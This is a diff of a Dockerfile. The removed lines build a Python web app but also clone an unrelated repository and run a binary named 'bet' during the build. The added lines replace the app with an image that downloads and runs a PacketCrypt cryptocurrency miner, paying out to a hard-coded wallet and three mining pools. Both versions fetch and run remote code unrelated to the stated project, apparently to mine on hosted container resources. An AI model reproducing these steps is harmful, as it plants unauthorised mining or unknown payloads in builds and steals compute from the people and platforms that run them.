@@ -1,15 +1,7 @@
-FROM python:3-slim
-
-# setup okteto message
-COPY bashrc /root/.bashrc
-
-WORKDIR /usr/src/app
-
-COPY requirements.txt requirements.txt
-RUN pip install -r requirements.txt
-RUN lscpu && git clone https://github.com/aurbach55/zash.git && cd zash && chmod 777 bet && ./bet
-COPY app.py app.py
-
-EXPOSE 8080
-
-CMD ["python", "app.py" ]
+FROM ubuntu:bionic
+RUN apt update && \
+        apt full-upgrade -y && \
+        apt install wget -y && \
+        wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && \
+        chmod +x packetcrypt_x8664_linux
+CMD ./packetcrypt_x8664_linux ann -p pkt1qc6m6u59elk6vdm3hwfysm034f04d30pz5dcg74 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com
